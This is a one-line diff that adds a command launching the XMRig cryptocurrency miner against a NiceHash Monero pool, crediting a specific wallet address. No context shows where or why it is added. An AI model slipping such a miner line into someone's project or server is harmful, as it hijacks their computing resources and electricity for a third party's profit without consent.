@@ -1,0 +1,1 @@
+./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbLYH412J3a9V6x2yJzb32m4Gouz7TXbhCe -p x -k --nicehash -a rx/0
